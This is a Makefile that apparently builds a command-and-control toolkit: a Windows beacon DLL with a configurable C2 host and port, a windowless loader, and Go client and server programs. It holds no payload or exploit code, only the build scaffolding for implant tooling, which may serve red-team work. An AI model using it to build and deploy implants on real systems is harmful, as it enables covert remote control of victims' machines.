# ==============================
# Toolchain
# ==============================
CC := x86_64-w64-mingw32-gcc
GO := go

# ==============================
# Beacon config (override at build time)
# ==============================
BEACON_HOST ?= 127.0.0.1
BEACON_PORT ?= 443
BEACON_DLL  ?= beacon.dll

# ==============================
# Flags
# ==============================
CFLAGS := -Wall -Wextra -Werror -O2 -Ibeacon/include \
          -DBEACON_C2_HOST=\"$(BEACON_HOST)\" \
          -DBEACON_C2_PORT=$(BEACON_PORT)

LDFLAGS_DLL    := -shared
LDLIBS_DLL     := -lwinhttp -liphlpapi -lnetapi32 -lbcrypt
LDFLAGS_LOADER := -mwindows

# ==============================
# Directories
# ==============================
BUILD_DIR := build
OBJ_DIR   := $(BUILD_DIR)/obj

# ==============================
# Sources
# ==============================
BEACON_SRC := $(shell find beacon/src -name "*.c")
BEACON_OBJ := $(patsubst %.c,$(OBJ_DIR)/%.o,$(BEACON_SRC))

# ==============================
# Targets
# ==============================
DLL_TARGET    := $(BUILD_DIR)/beacon.dll
LOADER_TARGET := $(BUILD_DIR)/loader.exe
CLIENT_TARGET := $(BUILD_DIR)/client
SERVER_TARGET := $(BUILD_DIR)/server

# ==============================
# Rules
# ==============================
.PHONY: all beacon loader go clean re

all: go

beacon: $(DLL_TARGET)

loader: $(LOADER_TARGET)

$(DLL_TARGET): $(BEACON_OBJ)
	@mkdir -p $(BUILD_DIR)
	$(CC) $(LDFLAGS_DLL) $^ $(LDLIBS_DLL) -o $@

$(LOADER_TARGET): loader/main.c
	@mkdir -p $(BUILD_DIR)
	$(CC) -Wall -O2 $(LDFLAGS_LOADER) -DBEACON_DLL=\"$(BEACON_DLL)\" $< -o $@

$(OBJ_DIR)/%.o: %.c
	@mkdir -p $(dir $@)
	$(CC) $(CFLAGS) -c $< -o $@

go:
	cd client && $(GO) build -o ../$(BUILD_DIR)/client
	cd server && $(GO) build -o ../$(BUILD_DIR)/server

clean:
	rm -rf $(BUILD_DIR)

re: clean all
